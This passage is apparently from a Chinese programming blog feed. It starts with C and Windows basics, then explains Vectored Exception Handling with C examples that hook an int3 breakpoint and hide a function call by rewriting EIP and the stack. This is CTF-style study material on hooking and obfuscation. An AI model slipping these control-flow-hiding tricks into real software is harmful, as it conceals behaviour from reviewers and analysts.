*),另一个还要传入的是arg，这里定义为void*p</span></span><br><span class="line"><span class="comment">//然后再定义一个以上面两个参数为函数参数，返回值是函数指针(这里是handle函数指针)的函数</span></span><br><span class="line"><span class="keyword">void</span> *(*call(<span class="keyword">void</span> *(fp)(<span class="keyword">void</span>*),<span class="keyword">void</span>*p))(<span class="keyword">void</span> *)<span class="comment">//在这里call是回调函数的变量名，void*是返回值，最后的(void*)是返回的函数指针的参数，call()里的两个是回调函数的参数</span></span><br><span class="line">{</span><br><span class="line">    fp(p);</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">void</span>*(*fp)(<span class="keyword">void</span>*)=call(handle,&amp;num);<span class="comment">//使用对应类型的函数指针接收</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//为了方便理解，使用typedef</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>*(*FP)(<span class="keyword">void</span>*);</span><br><span class="line"><span class="function">FP <span class="title">call</span><span class="params">(FP fp1,<span class="keyword">void</span>*p)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    fp1(p);</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x03-一维数组内存"><a class="header-anchor" href="#0x03-一维数组内存">¶</a>0x03-一维数组内存</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">6</span>]={<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>};<span class="comment">//当有初始值时，剩余没定义的默认为0，如果没有定义初始值，则为随机值</span></span><br></pre></td></tr></tbody></table></figure><p>因为数组长度定义为6，类型为int，所以在内存中分配24个字节</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649861619368.png" alt="数组在栈中的存储"></p><h1 id="0x04-函数声明"><a class="header-anchor" href="#0x04-函数声明">¶</a>0x04-函数声明</h1><p>返回值+函数名+参数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649862553289.png" alt="原因"></p><h1 id="0x05-调用约定"><a class="header-anchor" href="#0x05-调用约定">¶</a>0x05-调用约定</h1><p>为什么要有不同的调用约定——是因为调用函数之后需要清理栈，而不同的调用约定对应不同的清理方式</p><blockquote><p>__cdecl：调用者自己清理栈</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数外部</span></span><br><span class="line">call hello;函数</span><br><span class="line">add esp,立即数</span><br></pre></td></tr></tbody></table></figure><p>__stdcall：函数自己清理栈</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数内部</span></span><br><span class="line">retn 立即数</span><br></pre></td></tr></tbody></table></figure></blockquote><p>如果使用__cdcel调用方式，因为不同编译器产生的栈不同，所以不能很好地清理栈，而stdcall则可以在函数内部完成清理栈。</p><blockquote><p><strong>所以，在跨（开发）平台的调用中，我们都使用stdcall（有时是以WINAPI的样子出现）。那么为什么还需要_cdecl呢？当我们遇到这样的函数如fprintf()它的参数是可变的，不定长的，被调用者事先无法知道参数的长度，事后的清除工作也无法正常的进行，因此，这种情况我们只能使用cdecl</strong></p></blockquote><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898026998.png" alt></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898651751.png" alt></p><h1 id="0x06-extern-“C”"><a class="header-anchor" href="#0x06-extern-“C”">¶</a>0x06-extern “C”</h1><h2 id="原因"><a class="header-anchor" href="#原因">¶</a>原因</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898161708.png" alt></p><p>也就是说如果不声明为extern “C”，我们导出的函数名会被修饰</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898480365.png" alt="DLL代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898496934.png" alt="导出的函数名称"></p><p>可以看到我们的函数名被修饰了，在调用的时候我们无法通过GetProcAddress通过函数名调用</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898566926.png" alt="代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898581787.png" alt="导出的函数名称"></p><p>可以看到我们的函数名没有被修饰</p><blockquote><p><strong>C++函数重载即函数名可以相等，只要该函数的参数类型或者个数不同即可</strong></p></blockquote><h2 id="补充"><a class="header-anchor" href="#补充">¶</a>补充</h2><p>标准文件头</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __INCvxWorksh  <span class="comment">/*防止该头文件被重复引用*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __INCvxWorksh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus    <span class="comment">//__cplusplus是cpp中自定义的一个宏</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> {          <span class="comment">//告诉编译器，这部分代码按C语言的格式进行编译，而不是C++的</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**** some declaration or so *****/</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __INCvxWorksh */</span></span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>extern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用</p></blockquote><h1 id="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"><a class="header-anchor" href="#0x07-HMOUDLE、HANDLE、HWND、HINSTANCE">¶</a>0x07-HMOUDLE、HANDLE、HWND、HINSTANCE</h1><p><a href="https://www.cnblogs.com/wingsummer/p/15823780.html">https://www.cnblogs.com/wingsummer/p/15823780.html</a></p><p>这里就不看定义了，越看越晕（</p><h2 id="HWND"><a class="header-anchor" href="#HWND">¶</a>HWND</h2><p>HWND是线程相关的，可以通过HWND找到该窗口所属进程的句柄</p><h2 id="HANDLE"><a class="header-anchor" href="#HANDLE">¶</a>HANDLE</h2><p>Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄</p><blockquote><p><strong>系统对内核对象以链表的形式进行管理，载入到内存中的内核对象都有一个线性地址，同时相对系统来说，在串列中有一个索引位置，这个索引位置就是内核对象的HANDLE</strong></p></blockquote><h2 id="HINSTANCE"><a class="header-anchor" href="#HINSTANCE">¶</a>HINSTANCE</h2><p>HINSTANCE的本质是模块基地址，它仅在同一进程中才有意义，跨进程的HINSTANCE是没有意义的</p><h2 id="HMODULE"><a class="header-anchor" href="#HMODULE">¶</a>HMODULE</h2><blockquote><p><strong>代表应用程序载入的模块，WIN32系统下通常是被载入模块的线性地址，比如exe, dll等模块等</strong></p></blockquote><blockquote><p>HINSTANCE 在win32下与HMODULE是相同的东西(只有在16位windows上，二者有所不同)</p></blockquote><h1 id="0x08-命令行参数"><a class="header-anchor" href="#0x08-命令行参数">¶</a>0x08-命令行参数</h1><p>我们知道main函数实际上是有两个参数的，但一般不会进行使用</p><p>其原型如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008765976.png" alt></p><p>这两个参数实际上与命令行相关</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//argc是一个整数，其代表了命令行参数个数</span></span><br><span class="line"><span class="comment">//argv是一个指针数组，可以接收多个参数，第一个也就是argv[0]指向输入的程序路径及名称</span></span><br><span class="line"><span class="comment">//如果在命令行中运行，argc为1，也就是只有一个参数</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008701868.png" alt></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"命令行参数个数为：%d\n"</span>, argc);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第%d个命令行参数为：%s\n"</span>, i, argv[i]);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x09-有符号数和无符号数"><a class="header-anchor" href="#0x09-有符号数和无符号数">¶</a>0x09-有符号数和无符号数</h1><h2 id="unsigend和signed"><a class="header-anchor" href="#unsigend和signed">¶</a>unsigend和signed</h2><p>unsigned顾名思义就是无符号数，signed是有符号数</p><p>我们以char为例，char类型存储时为8位，当声明为signed的时候（不加unsigned的时候），最高位也就是第八位被当作符号位，当最高位为0的时候为正数，1时为负数，那么后七位就是数据位</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650504748332.png" alt></p><p>所以signed char也就是char可以表示-127-128的值（2**7）</p><p>当声明为unsigned char时，最高位也是数据位，此时可以表示0-256中的数据（2**8）</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650505930033.png" alt></p><h2 id="有符号数与无符号数的移位问题"><a class="header-anchor" href="#有符号数与无符号数的移位问题">¶</a>有符号数与无符号数的移位问题</h2><blockquote><p><strong>逻辑移位用于无符号数<br>算术移位用于有符号数</strong></p></blockquote><h3 id="逻辑移位"><a class="header-anchor" href="#逻辑移位">¶</a>逻辑移位</h3><p>对于逻辑移位，就是不考虑符号位，移位的结果只是数据所有的位数进行移位，左移时低位补0，右移时高位补0</p><h3 id="算术移位"><a class="header-anchor" href="#算术移位">¶</a>算术移位</h3><p>首先我们需要知道</p><blockquote><p><strong>C在存储数字的时候都采用补码的形式，而正数的原码、反码、补码都是一样的，左右移位时直接使用原码即可，负数的需要重新计算，补码计算：除符号位外，其他取反加一</strong></p></blockquote><p>算术移位，右移时（未溢出），保持符号位不变，同时用符号位补数值最高位</p><p>-65=11000001，转为补码为10111111，&gt;&gt;2变成11101111，再转为原码10010001，为-17</p><p>算术移位，左移时（未溢出），<strong>直接将数据最高有效位移入符号位，最低位补0</strong></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650505897036.png" alt></p><p>当符号位为1时，为负数，若数据最高位为0（补码的数据最高位），那么此时左移必定溢出，正数也同理</p><h1 id="0x0A-整型溢出与左移溢出"><a class="header-anchor" href="#0x0A-整型溢出与左移溢出">¶</a>0x0A-整型溢出与左移溢出</h1><h2 id="整型溢出"><a class="header-anchor" href="#整型溢出">¶</a>整型溢出</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650515001470.png" alt="无符号数整型溢出"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650515080645.png" alt="有符号数溢出"></p><p>0x7F就是01111111，也就是127，+1之后过渡到0x80，此时为1000000，也就是负数，该值为负数的最小值也就是-128</p><h2 id="左移溢出"><a class="header-anchor" href="#左移溢出">¶</a>左移溢出</h2><blockquote><p>左移和右移运算过程中也会发生溢出，移位位数并不是可以任意。当移位位数超过该数值类型的最大位数时，编译器会用移位位数去模该类型位数，然后按照余数进行移位。</p></blockquote><h1 id="0x0B-循环左移与循环右移"><a class="header-anchor" href="#0x0B-循环左移与循环右移">¶</a>0x0B-循环左移与循环右移</h1><p>循环移位区别于一般的移位时没有数位的丢失</p><blockquote><p><strong>循环左移时，用从左边移出的位填充字的右端；循环右移时，用从右边移出的位填充字的左端</strong></p></blockquote><p>以（unsigned char）0x51（无符号）为例，二进制为01010001，循环左移三位最终应该得到10001010，所以我们要先把前三位取出放置到最后三位，把最后五位前移，最后按位或，实现代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="number">0x51</span>&lt;&lt;<span class="number">3</span>)|(<span class="number">0x51</span>&gt;&gt;<span class="number">5</span>))</span><br></pre></td></tr></tbody></table></figure><p>01010001000+</p><p>00000000010</p><p>01010001010，因为最后要截断，需要&amp;0xFF</p><blockquote><p><strong>要注意的是有符号数的循环右移时，使用符号位填充</strong></p></blockquote><blockquote><p><strong>通用，总长度N(8,16,32)，循环左移n：(a&gt;&gt;(N-n))|(a&lt;&lt;n)，循环右移n：(a&lt;&lt;(N-n))|(a&gt;&gt;n)</strong></p></blockquote><h2 id="逆运算"><a class="header-anchor" href="#逆运算">¶</a>逆运算</h2><p>只需要将&lt;&lt;改为&gt;&gt;，&gt;&gt;改为&lt;&lt;即可</p><h1 id="0x0C-ida生成数组"><a class="header-anchor" href="#0x0C-ida生成数组">¶</a>0x0C-ida生成数组</h1><p>通过分析直到数组，然后点进去跳转到栈，右键-&gt;Array-&gt;填写最大大小，然后确定即可</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1652271943834.png" alt="生成数组前"></p><p>点击数组首元素v17</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1652272005586.png" alt></p><p>填写好数组大小</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1652272029957.png" alt="生成数组后"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一些基础知识的补充&lt;/p&gt;</summary>
    
    
    
    
    <category term="C" scheme="https://gift1a.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>VEH</title>
    <link href="https://gift1a.github.io/2022/04/10/VEH/"/>
    <id>https://gift1a.github.io/2022/04/10/VEH/</id>
    <published>2022-04-10T09:23:53.000Z</published>
    <updated>2022-04-20T05:31:40.862Z</updated>
    
    <content type="html"><![CDATA[<p>VEH</p> <span id="more"></span> <h1 id="0x00-VEH"><a class="header-anchor" href="#0x00-VEH">¶</a>0x00-VEH</h1><p>VEH的中文名字为：向量化异常处理 （Vectored Exception Handling） ，是为操作系统提供的异常处理机制，类似于SEH，VEH的优先级高于SEH</p><p><img src="/2022/04/10/VEH/592902_92wf161s7cgif01.png" alt="应用层异常处理结构图"></p><h1 id="0x01-VEH回调函数详解"><a class="header-anchor" href="#0x01-VEH回调函数详解">¶</a>0x01-VEH回调函数详解</h1><blockquote><p>VEH由AddVectorExceptionHandler添加处理函数，处理函数有一个参数</p><p>参数类型为PEXCEPTION_POINTERS结构体</p><p>结构PEXCEPTION_POINTERS保存着当前异常的各个寄存器，堆栈，地址等多种信息</p></blockquote><p><img src="/2022/04/10/VEH/592902_cvh37cwxtybvmyq.png" alt="pEXCEPTION_POINTER"></p><h1 id="0x02-VEH-Hook原理"><a class="header-anchor" href="#0x02-VEH-Hook原理">¶</a>0x02-VEH Hook原理</h1><blockquote><p>1、异常处理结构中，VEH是唯一一个可以接收到所有异常信息的处理。换句话说：所有的异常信息都会经过VEH</p><p>2、异常信息通常是由数组越界、内存访问出错、无效参数、int 3等造成的</p><p>3、一旦发生异常，操作系统会立即遍历VEH，如果有处理函数，中断线程，并由处理函数处理</p></blockquote><p>思路</p><p>如果我们要Hook消息框，首先要给API的首地址写入int 3断点，当执行时会产生异常，线程暂停，转交给异常处理函数处理，此时我们可以在处理函数中修改堆栈参数等</p><p>相应操作完成后将int 3(0xCC)修改回源代码 修改EIP=addr(异常地址)，然后让此处的代码重新执行一次正确的代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"ldata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> trapcode[] = <span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> llcode = <span class="number">204</span>;<span class="comment">//CC 00 00 00INT3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:ldata,RWE"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">llcode = <span class="number">0xF333333333333333</span>;</span><br><span class="line">llcode &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>* data = (<span class="keyword">char</span>*)&amp;llcode;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 解密shellcode 并且执行</span></span><br><span class="line"><span class="comment">* len 解密后的指令长度</span></span><br><span class="line"><span class="comment">* data 把解密后的指令写入data</span></span><br><span class="line"><span class="comment">* 比如 push ebp 就向data写入0x55</span></span><br><span class="line"><span class="comment">* 每次解密一条指令 不要用超过7字节的指令和跳转指令</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打辣"</span>, <span class="string">"停下"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandle</span><span class="params">(PEXCEPTION_POINTERS val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//判断是否为int3断点</span></span><br><span class="line"><span class="keyword">if</span> (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)</span><br><span class="line">{</span><br><span class="line">Decshellcode();<span class="comment">//执行shellcode</span></span><br><span class="line"><span class="comment">//修改EIP</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;</span><br><span class="line"><span class="comment">//表示成功处理，让程序继续执行</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//继续往下搜索异常处理函数</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//创建VEH，当第一个参数不为0，则异常处理函数是第一个要调用的处理程序。如果参数为0，则处理程序是要调用的最后一个处理程序</span></span><br><span class="line"><span class="comment">//第二个参数是一个异常处理函数</span></span><br><span class="line">AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandle);</span><br><span class="line"><span class="keyword">int</span> bilibili = <span class="number">2020</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)&amp;llcode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/10/VEH/1649639633494.png" alt></p><p>这里修改EIP为我们的Print()函数，因为函数名表示的就是函数地址，所以就是让他执行我们的Print函数</p><h1 id="0x03-VEH实现隐藏函数调用"><a class="header-anchor" href="#0x03-VEH实现隐藏函数调用">¶</a>0x03-VEH实现隐藏函数调用</h1><p>我们知道函数调用时，会先把call的地址压入栈中，而在函数内部的返回ret指令就是从栈中取出call指令的下一条地址</p><p>所以我们可以对栈中的地址进行修改让其调用我们的函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"this is flag"</span>, <span class="string">"flag"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//将EIP也就是下一条执行的指令修改为ret</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Eip += <span class="number">6</span>;</span><br><span class="line"><span class="comment">//降低栈顶</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Esp -= <span class="number">4</span>;</span><br><span class="line"><span class="comment">//入栈,将ret下一条指令压入栈中</span></span><br><span class="line">*(<span class="keyword">int</span>*)val-&gt;ContextRecord-&gt;Esp = val-&gt;ContextRecord-&gt;Eip + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//和上面一样，这次修改为我们想要执行的地址</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Esp -= <span class="number">4</span>;</span><br><span class="line">*(<span class="keyword">int</span>*)val-&gt;ContextRecord-&gt;Esp=*(<span class="keyword">int</span>*)(val-&gt;ContextRecord-&gt;Ebp<span class="number">-8</span>);</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandler);</span><br><span class="line">DWORD a = (DWORD)showflag;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line">c=a / k;<span class="comment">//构造除0异常</span></span><br><span class="line">__asm</span><br><span class="line">{</span><br><span class="line">ret</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Get flag!!!"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>具体的可以先看汇编</p><p><img src="/2022/04/10/VEH/1649645606291.png" alt></p><p>触发除零异常后，PEXCEPTION_POINTERS val会接收此时的信息</p><p>我们先将EIP修改为ret指令，然后将ret下一条指令压入栈中，再把我们要调用的函数压入栈，这时候栈的结构为</p><p><img src="/2022/04/10/VEH/1649645936725.png" alt></p><p>返回值为EXCEPTION_CONTINUE_EXECUTION，表示继续往下执行，这时候EIP是ret指令，取出栈顶元素，跳转过去，执行完我们的shellcode后也存在ret，此时的栈为</p><p><img src="/2022/04/10/VEH/1649646048618.png" alt></p><p>shellcode尾部的ret取出栈顶的值，跳转过去，回到我们正常的程序</p><blockquote><p>修改EIP的时候也可以</p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">val</span>-&gt;</span>C<span class="function"><span class="title">ontextRecord</span>-&gt;</span>E<span class="function"><span class="title">ip</span> = (DWORD)val-&gt;</span>E<span class="function"><span class="title">xceptionRecord</span>-&gt;</span>ExceptionAddress+<span 